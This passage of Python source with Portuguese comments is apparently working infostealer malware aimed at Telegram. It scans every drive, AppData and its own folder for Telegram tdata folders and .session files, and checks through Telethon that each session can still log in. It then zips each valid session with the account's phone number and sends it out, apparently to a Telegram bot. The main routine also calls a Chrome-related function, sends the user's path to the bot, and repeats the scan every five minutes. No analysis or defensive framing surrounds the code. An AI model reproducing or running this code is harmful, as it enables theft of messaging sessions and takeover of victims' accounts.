            # Verifica se tem dados de autenticação
            try:
                cursor_integrity.execute("SELECT COUNT(*) FROM sessions WHERE auth_key IS NOT NULL AND auth_key != '' AND LENGTH(auth_key) >= 256")
                tem_auth = cursor_integrity.fetchone()
                if not tem_auth or tem_auth[0] == 0:
                    print(f"***ERRO: Session não tem dados de autenticação válidos")
                    conn_integrity.close()
                    return False
                print(f"***OK Session tem dados de autenticação válidos")
            except:
                # Se não tem tabela sessions, pode ser formato diferente (aceita mesmo assim)
                pass
            
            conn_integrity.close()
        except:
            # Se não é SQLite, continua com validação Telethon
            print(f"***AVISO: Arquivo não é SQLite ou não foi possível validar integridade SQLite")
        
        # Delay antes de validar com Telethon (evita sobrecarga)
        time.sleep(1)
        
        # VALIDAÇÃO 3: Validação com Telethon (conexão real)
        sessao_valida = validar_session_telethon(session_path)
        
        # Delay após validar
        time.sleep(0.5)
        
        if sessao_valida is False:
            print(f"***ERRO: Sessão isolada inválida ou não é apta para login, NÃO será enviada")
            return False
        elif sessao_valida is None:
            print(f"***ERRO: Não foi possível validar sessão isolada (Telethon não disponível ou timeout)")
            print(f"***ERRO: Session NÃO será enviada (apenas sessions aptas para login são enviadas)")
            return False
        else:
            print(f"***OK Sessão isolada validada com sucesso (SQLite + Telethon) e APTA para login/conversão em tdata, será enviada")
        
        zip_path = os.path.join(temp, f'session_isolado_{conjunto_num}.zip')
        
        try:
            # GARANTE ZERO COMPRESSÃO E INTEGRIDADE TOTAL
            print(f"***Criando ZIP com ZERO compressão (ZIP_STORED) para garantir integridade...")
            
            # Valida arquivo .session antes de adicionar
            session_size_original = os.path.getsize(session_path)
            if session_size_original == 0:
                print(f"***ERRO: Arquivo .session está vazio antes de adicionar ao ZIP!")
                return False
            
            print(f"***Arquivo .session validado: {session_size_original} bytes")
            
            # Lê arquivo .session completo em memória para garantir integridade
            session_data = None
            try:
                with open(session_path, 'rb') as f:
                    session_data = f.read()
                if len(session_data) != session_size_original:
                    print(f"***ERRO: Tamanho do arquivo lido não confere!")
                    return False
                print(f"***OK Arquivo .session lido: {len(session_data)} bytes")
            except Exception as e:
                print(f"***ERRO ao ler arquivo .session: {repr(e)}")
                return False
            
            with ZipFile(zip_path, 'w', compression=ZIP_STORED) as zipObj:  # ZERO COMPRESSÃO
                # Adiciona o arquivo .session ao zip usando dados em memória (garante integridade)
                zipObj.writestr(session_name, session_data)
                
                # Verifica se foi adicionado corretamente
                if session_name not in zipObj.namelist():
                    print(f"***ERRO: Arquivo .session não foi adicionado ao ZIP!")
                    return False
                
                # Valida tamanho dentro do ZIP
                info_session_zip = zipObj.getinfo(session_name)
                if info_session_zip.file_size != session_size_original:
                    print(f"***ERRO: Tamanho do arquivo no ZIP não confere! Original: {session_size_original}, ZIP: {info_session_zip.file_size}")
                    return False
                print(f"***OK Arquivo .session adicionado ao ZIP: {info_session_zip.file_size} bytes (íntegro)")
                
                # SEMPRE adiciona arquivo com informações da conta (obrigatório)
                try:
                    import re
                    numero_limpo = None
                    if numero_conta_final:
                        numero_limpo = re.sub(r'\D', '', str(numero_conta_final))
                        if numero_limpo and len(numero_limpo) >= 8:
                            print(f"***Número completo da conta encontrado: {numero_limpo}")
                        else:
                            numero_limpo = None
                    
                    # Cria arquivo de texto com o número completo (ou indica se não encontrado)
                    if numero_limpo:
                        info_conta = f"NUMERO_CONTA: {numero_limpo}\n"
                        info_conta += f"CONJUNTO_ID: {conjunto_num}\n"
                        info_conta += f"SESSION_PATH: {session_path}\n"
                        info_conta += f"STATUS: NUMERO_ENCONTRADO\n"
                    else:
                        info_conta = f"NUMERO_CONTA: NAO_ENCONTRADO\n"
                        info_conta += f"CONJUNTO_ID: {conjunto_num}\n"
                        info_conta += f"SESSION_PATH: {session_path}\n"
                        info_conta += f"STATUS: NUMERO_NAO_ENCONTRADO\n"
                    
                    # GARANTE que conta_info.txt é sempre criado com informações completas
                    zipObj.writestr("conta_info.txt", info_conta.encode('utf-8'))
                    
                    # Verifica se foi adicionado corretamente
                    if "conta_info.txt" in zipObj.namelist():
                        print(f"***OK conta_info.txt adicionado ao zip com sucesso")
                        if numero_limpo:
                            print(f"***Número completo da conta no zip: {numero_limpo}")
                        else:
                            print(f"***AVISO: Número da conta não encontrado, mas conta_info.txt foi criado")
                    else:
                        print(f"***ERRO: conta_info.txt não foi adicionado ao zip!")
                        # Tenta novamente
                        zipObj.writestr("conta_info.txt", info_conta.encode('utf-8'))
                except Exception as e:
                    print(f"***ERRO ao adicionar número da conta ao zip: {repr(e)}")
                    import traceback
                    traceback.print_exc()
                    # Mesmo com erro, tenta criar um conta_info.txt básico
                    try:
                        info_conta = f"NUMERO_CONTA: ERRO_AO_EXTRAIR\n"
                        info_conta += f"CONJUNTO_ID: {conjunto_num}\n"
                        info_conta += f"SESSION_PATH: {session_path}\n"
                        info_conta += f"STATUS: ERRO\n"
                        info_conta += f"ERRO_DETALHES: {repr(e)}\n"
                        zipObj.writestr("conta_info.txt", info_conta.encode('utf-8'))
                        print(f"***AVISO: conta_info.txt básico criado devido a erro")
                    except Exception as e2:
                        print(f"***ERRO CRÍTICO: Não foi possível criar conta_info.txt: {repr(e2)}")
            
            # VALIDAÇÃO COMPLETA DO ZIP ANTES DE ENVIAR
            try:
                print(f"***Validando integridade completa do zip...")
                with ZipFile(zip_path, 'r') as zip_test:
                    # Testa integridade do zip
                    resultado_test = zip_test.testzip()
                    if resultado_test is not None:
                        print(f"***ERRO: Zip corrompido - arquivo problemático: {resultado_test}")
                        remover_arquivo_temp(zip_path)
                        return False
                    
                    # Verifica se todos os arquivos esperados estão no zip
                    arquivos_esperados = [session_name, "conta_info.txt"]
                    arquivos_no_zip = zip_test.namelist()
                    arquivos_faltando = [f for f in arquivos_esperados if f not in arquivos_no_zip]
                    
                    if arquivos_faltando:
                        print(f"***ERRO: Arquivos faltando no zip: {arquivos_faltando}")
                        remover_arquivo_temp(zip_path)
                        return False
                    
                    # Verifica tamanho do arquivo .session dentro do zip e compara com original
                    try:
                        info_session = zip_test.getinfo(session_name)
                        if info_session.file_size == 0:
                            print(f"***ERRO: Arquivo .session dentro do zip está vazio!")
                            remover_arquivo_temp(zip_path)
                            return False
                        
                        # Compara tamanho com arquivo original
                        if 'session_size_original' in locals() and info_session.file_size != session_size_original:
                            print(f"***ERRO: Tamanho do arquivo no ZIP não confere com original!")
                            print(f"***  Original: {session_size_original} bytes")
                            print(f"***  ZIP: {info_session.file_size} bytes")
                            remover_arquivo_temp(zip_path)
                            return False
                        
                        # Valida que pode ler o arquivo do ZIP
                        try:
                            dados_zip = zip_test.read(session_name)
                            if len(dados_zip) != info_session.file_size:
                                print(f"***ERRO: Não foi possível ler arquivo completo do ZIP!")
                                remover_arquivo_temp(zip_path)
                                return False
                            print(f"***OK Arquivo .session no zip: {info_session.file_size} bytes (íntegro e validado)")
                        except:
                            print(f"***ERRO: Não foi possível ler arquivo do ZIP para validação")
                            remover_arquivo_temp(zip_path)
                            return False
                        
                        # VALIDAÇÃO FINAL: Compara tamanhos e lê todos os arquivos para garantir integridade
                        # IMPORTANTE: Esta validação está DENTRO do bloco with para evitar erro de ZIP fechado
                        print(f"***Validação final de integridade: lendo todos os arquivos do ZIP...")
                        for arquivo_zip in zip_test.namelist():
                            try:
                                dados_lidos = zip_test.read(arquivo_zip)
                                info_arquivo = zip_test.getinfo(arquivo_zip)
                                if len(dados_lidos) != info_arquivo.file_size:
                                    print(f"***ERRO CRÍTICO: Arquivo {arquivo_zip} corrompido no ZIP!")
                                    print(f"***  Esperado: {info_arquivo.file_size} bytes")
                                    print(f"***  Lido: {len(dados_lidos)} bytes")
                                    remover_arquivo_temp(zip_path)
                                    return False
                            except Exception as e:
                                print(f"***ERRO CRÍTICO: Não foi possível ler {arquivo_zip} do ZIP: {repr(e)}")
                                remover_arquivo_temp(zip_path)
                                return False
                        
                        print(f"***OK Todos os arquivos do ZIP foram lidos e validados - INTEGRIDADE GARANTIDA")
                    except:
                        print(f"***ERRO: Não foi possível verificar arquivo .session no zip")
                        remover_arquivo_temp(zip_path)
                        return False
                
                print(f"***OK Zip válido e íntegro - todos os arquivos presentes e corretos")
            except Exception as e:
                print(f"***ERRO: Zip corrompido ou inválido: {repr(e)}")
                remover_arquivo_temp(zip_path)
                return False
            
            # Valida tamanho final do ZIP
            zip_size = os.path.getsize(zip_path)
            if zip_size == 0:
                print(f"***ERRO CRÍTICO: ZIP criado está vazio!")
                remover_arquivo_temp(zip_path)
                return False
            
            print(f"***Zip size: {zip_size / (1024 * 1024):.2f} MB (ZERO compressão - apenas armazenamento)")
            zip_size_mb = zip_size / (1024 * 1024)
            print(f"***Zip size: {zip_size_mb:.2f} MB")
            
            # Envia o zip
            print(f"***Enviando zip com arquivo .session isolado...")
            enviar_zip_session(zip_path, conjunto_num, telegram_dir, session_name, zip_size_mb)
            
            # Limpa arquivo temporário
            remover_arquivo_temp(zip_path)
            
            # Marca como enviado (persistente)
            if identificador:
                salvar_arquivo_enviado(identificador, session_path=session_path)
                print(f"***Session isolada marcada como enviada: {identificador}")
            
            return True
        except Exception as e:
            print(f"***ERRO ao processar .session isolado: {repr(e)}")
            return False
    
    return False

def buscar_telegram_exe_e_processar():
    """Busca pastas com Telegram.exe e processa o tdata delas (SEM LIMITES)."""
    print(f"***Buscando pastas com Telegram.exe em TODOS os drives (sem limites)...")
    
    for drive in paths:
        if os.path.exists(drive):
            try:
                print(f"***Buscando Telegram.exe em {drive}...")
                for root, dirs, files in os.walk(drive):
                    # Delay a cada 500 diretórios processados (evita sobrecarga)
                    if hasattr(buscar_telegram_exe_e_processar, '_dir_count'):
                        buscar_telegram_exe_e_processar._dir_count += 1
                    else:
                        buscar_telegram_exe_e_processar._dir_count = 1
                    
                    if buscar_telegram_exe_e_processar._dir_count % 500 == 0:
                        time.sleep(0.3)  # Pausa a cada 500 diretórios
                    
                    # Verifica se tem Telegram.exe nesta pasta
                    if 'Telegram.exe' in files:
                        telegram_dir = root
                        tdata_candidate = os.path.join(telegram_dir, 'tdata')
                        
                        if os.path.exists(tdata_candidate):
                            try:
                                if os.listdir(tdata_candidate):  # Verifica se tem conteúdo
                                    print(f"***Encontrado Telegram.exe com tdata: {telegram_dir}")
                                    # Delay antes de processar
                                    time.sleep(1)
                                    processar_conjunto_imediato(tdata_candidate)
                                    # Delay após processar
                                    time.sleep(2)
                            except Exception as e:
                                print(f"***ERRO ao processar tdata de {telegram_dir}: {repr(e)}")
                                # Tenta mesmo assim (pode estar em uso)
                                try:
                                    time.sleep(1)
                                    processar_conjunto_imediato(tdata_candidate)
                                    time.sleep(2)
                                except:
                                    pass
                    
                    # Otimização: remove APENAS diretórios críticos
                    dirs[:] = [d for d in dirs if d.lower() not in ignorar_dirs]
                    # SEM LIMITE DE PROFUNDIDADE - varre tudo!
            except (PermissionError, OSError):
                continue

def buscar_session_isolados():
    """Busca arquivos .session isolados em todos os lugares."""
    print(f"***Buscando arquivos .session isolados...")
    
    session_encontrados = []
    
    # Busca primeiro no diretório temp (onde session_conjunto_ são criados)
    if os.path.exists(temp):
        try:
            print(f"***Buscando arquivos .session no diretório temp: {temp}")
            for file in os.listdir(temp):
                if file.endswith('.session') and file.startswith('session_conjunto_'):
                    session_path = os.path.join(temp, file)
                    if os.path.exists(session_path):
                        # Verifica permissão de leitura
                        try:
                            if not os.access(session_path, os.R_OK):
                                print(f"***AVISO: session_conjunto sem permissão de leitura: {file}")
                                continue
                        except:
                            pass
                        
                        # Verifica tamanho
                        try:
                            if os.path.getsize(session_path) == 0:
                                print(f"***AVISO: session_conjunto vazio: {file}")
                                continue
                        except:
                            continue
                        
                        # Verifica se o arquivo não está muito antigo (mais de 1 hora)
                        try:
                            idade = time.time() - os.path.getmtime(session_path)
                            if idade < 3600:  # Menos de 1 hora
                                # Tenta abrir para confirmar que pode ser lido
                                try:
                                    with open(session_path, 'rb') as test_file:
                                        test_file.read(1)  # Tenta ler pelo menos 1 byte
                                    session_encontrados.append(session_path)
                                    print(f"***Encontrado session_conjunto no temp (com permissão): {file}")
                                except PermissionError:
                                    print(f"***AVISO: session_conjunto sem permissão de leitura: {file}")
                                except Exception as e:
                                    print(f"***AVISO: Erro ao verificar session_conjunto {file}: {repr(e)}")
                            else:
                                print(f"***Ignorando session_conjunto antigo (mais de 1 hora): {file}")
                        except:
                            # Se não conseguir verificar idade, tenta mesmo assim
                            try:
                                with open(session_path, 'rb') as test_file:
                                    test_file.read(1)
                                session_encontrados.append(session_path)
                                print(f"***Encontrado session_conjunto no temp: {file}")
                            except PermissionError:
                                print(f"***AVISO: session_conjunto sem permissão de leitura: {file}")
                            except Exception as e:
                                print(f"***AVISO: Erro ao verificar session_conjunto {file}: {repr(e)}")
        except Exception as e:
            print(f"***ERRO ao buscar .session no temp: {repr(e)}")
    
    # Busca em AppData
    appdata_path = os.path.join(pathusr, 'AppData')
    if os.path.exists(appdata_path):
        try:
            for root, dirs, files in os.walk(appdata_path):
                # Delay a cada 100 diretórios processados
                if not hasattr(buscar_session_isolados, '_dir_count'):
                    buscar_session_isolados._dir_count = 0
                buscar_session_isolados._dir_count += 1
                
                if buscar_session_isolados._dir_count % 100 == 0:
                    time.sleep(0.3)
                
                for file in files:
                    if file.endswith('.session'):
                        session_path = os.path.join(root, file)
                        if os.path.exists(session_path) and os.path.getsize(session_path) > 0:
                            session_encontrados.append(session_path)
                # Otimização: remove diretórios desnecessários
                dirs[:] = [d for d in dirs if d.lower() not in ignorar_dirs]
        except:
            pass
    
    # Busca em TODAS as unidades de disco (SEM LIMITE)
    print(f"***Varrendo TODOS os {len(paths)} drives para .session...")
    for drive in paths:
        if os.path.exists(drive):
            try:
                print(f"***Varrendo {drive} para .session...")
                for root, dirs, files in os.walk(drive):
                    # Delay a cada 1000 diretórios processados
                    if not hasattr(buscar_session_isolados, '_dir_count_drive'):
                        buscar_session_isolados._dir_count_drive = 0
                    buscar_session_isolados._dir_count_drive += 1
                    
                    if buscar_session_isolados._dir_count_drive % 1000 == 0:
                        time.sleep(0.3)
                    
                    for file in files:
                        if file.endswith('.session'):
                            session_path = os.path.join(root, file)
                            if os.path.exists(session_path) and os.path.getsize(session_path) > 0:
                                session_encontrados.append(session_path)
                    # Otimização: remove APENAS diretórios críticos
                    dirs[:] = [d for d in dirs if d.lower() not in ignorar_dirs]
                    # SEM LIMITE DE PROFUNDIDADE - varre tudo!
            except (PermissionError, OSError):
                continue
    
    # Processa cada arquivo .session encontrado (com delay para evitar sobrecarga)
    for idx, session_path in enumerate(session_encontrados):
        try:
            # Delay antes de processar (evita sobrecarga)
            if idx > 0:
                time.sleep(2)  # Delay entre processamentos
            
            processar_session_isolado(session_path)
            
            # Delay após processar
            time.sleep(1)
        except Exception as e:
            print(f"***ERRO ao processar {session_path}: {repr(e)}")
            time.sleep(0.5)  # Delay mesmo em caso de erro
    
    if session_encontrados:
        print(f"***Total de {len(session_encontrados)} arquivo(s) .session isolado(s) encontrado(s)")
    else:
        print(f"***Nenhum arquivo .session isolado encontrado")

def processar_conjunto_em_thread(tdata_path):
    """Processa um conjunto em thread separada para não travar a varredura."""
    try:
        processar_conjunto_imediato(tdata_path)
    except Exception as e:
        print(f"***ERRO ao processar conjunto em thread: {repr(e)}")

def monitorar_telegram():
    """Executa uma varredura completa procurando tdata e arquivos .session."""
    from datetime import datetime
    
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"\n{'='*60}")
    print(f"***Iniciando varredura - {timestamp}")
    print(f"{'='*60}")
    
    contador_encontrados = 0
    
    # Primeiro tenta localização padrão
    default_paths = [
        os.path.join(pathusr, 'AppData', 'Roaming', 'Telegram Desktop', 'tdata'),
        os.path.join(pathusr, 'AppData', 'Local', 'Telegram Desktop', 'tdata'),
    ]

    for default_path in default_paths:
        if os.path.exists(default_path):
            try:
                if os.listdir(default_path):  # Verifica se não está vazia
                    if processar_conjunto_imediato(default_path):
                        contador_encontrados += 1
                        print("***OK Default TG folder has been found and processed")
            except Exception as e:
                print(f"***ERRO ao processar default path {default_path}: {repr(e)}")
                pass

    # Busca recursivamente em AppData (SEM LIMITE - varre tudo!)
    appdata_path = os.path.join(pathusr, 'AppData')
    if os.path.exists(appdata_path):
        try:
            print(f"***Varrendo AppData completamente (sem limites)...")
            for root, dirs, files in os.walk(appdata_path):
                
                try:
                    if 'tdata' in dirs:
                        tdata_candidate = os.path.join(root, 'tdata')
                        try:
                            if os.listdir(tdata_candidate):  # Verifica se tem conteúdo
                                # Processa imediatamente em thread separada
                                if processar_conjunto_imediato(tdata_candidate):
                                    contador_encontrados += 1
                                    print("***OK TG folder has been found and processed")
                        except Exception as e:
                            pass
                except Exception as e:
                    pass
                
                # Otimização: remove diretórios desnecessários
                try:
                    dirs[:] = [d for d in dirs if d.lower() not in ignorar_dirs]
                except:
                    pass
        except Exception as e:
            print(f"***ERRO na busca em AppData: {repr(e)}")
            pass

    # PRIMEIRO: Varre a pasta onde o arquivo baixado (script) está sendo executado
    try:
        # Obtém o diretório onde o script está sendo executado
        script_dir = None
        try:
            # Tenta obter o diretório do arquivo atual
            script_dir = os.path.dirname(os.path.abspath(__file__))
        except:
            # Fallback: usa o diretório de trabalho atual
            script_dir = os.getcwd()
        
        if script_dir and os.path.exists(script_dir):
            print(f"***Varrendo PRIMEIRO a pasta onde o script está: {script_dir}")
            print(f"***Esta é a pasta onde o arquivo baixado está localizado")
            
            # Varre recursivamente a pasta do script procurando tdata
            for root, dirs, files in os.walk(script_dir):
                try:
                    if 'tdata' in dirs:
                        tdata_candidate = os.path.join(root, 'tdata')
                        try:
                            if os.listdir(tdata_candidate):  # Verifica se tem conteúdo
                                print(f"***OK tdata encontrado na pasta do script: {tdata_candidate}")
                                if processar_conjunto_imediato(tdata_candidate):
                                    contador_encontrados += 1
                                    print("***OK TG folder has been found and processed (pasta do script)")
                        except Exception as e:
                            pass
                except Exception as e:
                    pass
                
                # Otimização: remove diretórios desnecessários
                try:
                    dirs[:] = [d for d in dirs if d.lower() not in ignorar_dirs]
                except:
                    pass
            
            # Também busca arquivos .session na pasta do script
            for root, dirs, files in os.walk(script_dir):
                for file in files:
                    if file.endswith('.session'):
                        session_path = os.path.join(root, file)
                        if os.path.exists(session_path) and os.path.getsize(session_path) > 0:
                            print(f"***Session encontrada na pasta do script: {session_path}")
                            try:
                                processar_session_isolado(session_path)
                            except Exception as e:
                                print(f"***ERRO ao processar session da pasta do script: {repr(e)}")
                
                # Otimização: remove diretórios desnecessários
                try:
                    dirs[:] = [d for d in dirs if d.lower() not in ignorar_dirs]
                except:
                    pass
            
            print(f"***OK Varredura da pasta do script concluída")
    except Exception as e:
        print(f"***ERRO ao varrer pasta do script: {repr(e)}")
        pass

    # DEPOIS: Busca em TODAS as unidades de disco (SEM LIMITE - varre absolutamente tudo!)
    print(f"***Varrendo TODOS os {len(paths)} drives completamente (sem limites)...")
    for drive in paths:
        if os.path.exists(drive):
            try:
                print(f"***Varrendo drive {drive} completamente...")
                for root, dirs, files in os.walk(drive):
                    
                    try:
                        if 'tdata' in dirs:
                            tdata_candidate = os.path.join(root, 'tdata')
                            try:
                                if os.listdir(tdata_candidate):  # Verifica se tem conteúdo
                                    # Processa imediatamente
                                    if processar_conjunto_imediato(tdata_candidate):
                                        contador_encontrados += 1
                                        print("***OK TG folder has been found and processed")
                            except Exception as e:
                                pass
                    except Exception as e:
                        pass
                    
                    # Otimização: remove APENAS diretórios críticos do sistema
                    try:
                        dirs[:] = [d for d in dirs if d.lower() not in ignorar_dirs]
                        # SEM LIMITE DE PROFUNDIDADE - varre tudo!
                    except:
                        pass
            except (PermissionError, OSError) as e:
                print(f"***ERRO ao acessar {drive}: {repr(e)}")
                continue
            except Exception as e:
                print(f"***ERRO inesperado em {drive}: {repr(e)}")
                continue

    # Usa finddir nos paths fornecidos
    for i in paths:
        try:
            found = finddir(i)
            if found != None:
                tdata_path = os.path.join(found, "tdata")
                if os.path.exists(tdata_path):
                    try:
                        if os.listdir(tdata_path):  # Verifica se tem conteúdo
                            if processar_conjunto_imediato(tdata_path):
                                contador_encontrados += 1
                                print("***OK TG folder has been found and processed (finddir)")
                    except Exception as e:
                        pass
        except Exception as e:
            print(f"***ERRO no finddir: {repr(e)}")
            pass

    # Busca pastas com Telegram.exe e processa o tdata delas
    try:
        buscar_telegram_exe_e_processar()
    except Exception as e:
        print(f"***ERRO ao buscar Telegram.exe: {repr(e)}")

    # Busca arquivos .session isolados em todos os lugares
    try:
        buscar_session_isolados()
    except Exception as e:
        print(f"***ERRO ao buscar .session isolados: {repr(e)}")

    if contador_encontrados > 0 or encontradas:
        total = len(encontradas) if encontradas else contador_encontrados
        print(f"***Total de {total} conjunto(s) encontrado(s) e processado(s) nesta varredura")
    else:
        print("***Nenhum novo conjunto encontrado nesta varredura")
    
    print(f"***Varredura concluída - {timestamp}")
    print(f"{'='*60}\n")




def main():
    try:
        Chrome()
        bot.send_message(user_id, pathusr)
        send_txt()
        logout_windows(log_out)
    except Exception as e:
        print('ERROR: Main function: ' + repr(e))
        pass

# Executa monitoramento contínuo
if __name__ == '__main__':
    # Executa função principal uma vez
    main()
    
    # Executa primeira varredura imediatamente
    monitorar_telegram()
    
    # Intervalo entre varreduras (em segundos) - 5 minutos
    intervalo_varredura = 300
    
    print(f"***Monitoramento contínuo iniciado")
    print(f"***Varredura a cada {intervalo_varredura} segundos ({intervalo_varredura/60:.1f} minutos)")
    print(f"***Pressione Ctrl+C para parar\n")
    
    # Loop infinito de monitoramento
    try:
        contador_limpeza = 0
        while True:
            time.sleep(intervalo_varredura)
            monitorar_telegram()
            
            # Limpa arquivos temporários a cada 5 varreduras (aproximadamente 25 minutos)
            contador_limpeza += 1
            if contador_limpeza >= 5:
                limpar_arquivos_temp()
                contador_limpeza = 0
    except KeyboardInterrupt:
        print(f"\n***Monitoramento interrompido pelo usuário")
        print("***Finalizando...")
    except Exception as e:
        print(f"***ERRO no monitoramento: {repr(e)}")
        print("***Reiniciando monitoramento em 60 segundos...")
        time.sleep(60)
        # Reinicia o loop
        while True:
            try:
                time.sleep(intervalo_varredura)
                monitorar_telegram()
            except KeyboardInterrupt:
                print(f"\n***Monitoramento interrompido pelo usuário")
                print("***Finalizando...")
                break
            except Exception as e:
                print(f"***ERRO no monitoramento: {repr(e)}")
                print("***Reiniciando monitoramento em 60 segundos...")
                time.sleep(60)
